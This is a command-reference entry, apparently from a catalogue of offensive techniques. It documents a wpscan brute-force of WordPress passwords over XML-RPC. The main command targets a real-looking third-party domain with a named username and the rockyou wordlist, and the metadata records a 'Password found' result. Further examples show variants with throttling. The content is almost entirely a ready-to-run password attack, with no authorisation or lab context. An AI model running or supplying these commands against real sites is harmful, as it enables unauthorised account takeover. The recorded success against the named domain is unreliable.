---
id: cmd-wpscan-bruteforce
data: >-
  wpscan --url https://nextcloud.com -U frank -P
  /usr/share/wordlists/rockyou.txt --password-attack xmlrpc
tags:
  - bruteforce
  - wordpress
type: command
output: 'Password found: weakpass'
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:36.642Z'
verified: false
validated: true
submitted: true
---
# wpscan-bruteforce-password

## Command

```bash
wpscan --url https://nextcloud.com -U frank -P /usr/share/wordlists/rockyou.txt --password-attack xmlrpc
```

## Description

Brute forces WordPress login using a known username and wordlist, preferring XML-RPC for speed.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-U` | Username to attack | Yes |
| `-P` | Path to password list | Yes |
| `--password-attack xmlrpc` | Use XML-RPC method | No |

## Examples

### Basic Usage

```bash
wpscan --url https://example.com -U admin -P passwords.txt
```

### Advanced Usage

```bash
wpscan --url https://example.com -U admin -P passwords.txt --password-attack login --throttle 1000
```

## Expected Output

Progress updates and success message like "[+] Password found: 'weakpass'".

## Related

- [[Related Procedure: Brute-Force-WordPress-Admin-Login-with-WPScan]]
